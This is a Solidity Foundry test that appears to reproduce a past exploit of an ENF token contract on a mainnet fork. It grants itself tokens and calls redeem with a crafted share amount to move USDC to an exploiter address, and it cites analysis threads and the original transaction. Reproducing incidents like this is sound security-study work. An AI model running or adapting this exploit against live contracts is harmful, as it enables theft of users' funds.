// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/peckshield/status/1630490333716029440
// https://twitter.com/drdr_zz/status/1630500170373685248
// https://twitter.com/gbaleeeee/status/1630587522698080257
// @TX
// https://etherscan.io/tx/0x1fe5a53405d00ce2f3e15b214c7486c69cbc5bf165cf9596e86f797f62e81914

interface IENF is IERC20 {
    function redeem(uint256 shares, address receiver) external;
}

contract ContractTest is Test {
    IENF ENF = IENF(0xBDB515028A6fA6CD1634B5A9651184494aBfD336);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    address exploiter = 0x8B5A8333eC272c9Bca1E43F4d009E9B2FAd5EFc9;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 16_696_239);
    }

    function testExploit() external {
        deal(address(ENF), address(this), 1e18);
        cheats.startPrank(address(this), address(this));
        ENF.redeem(676_562, exploiter);
        cheats.stopPrank();

        emit log_named_decimal_uint("Exploiter USDC balance after exploit", USDC.balanceOf(exploiter), USDC.decimals());
    }
}
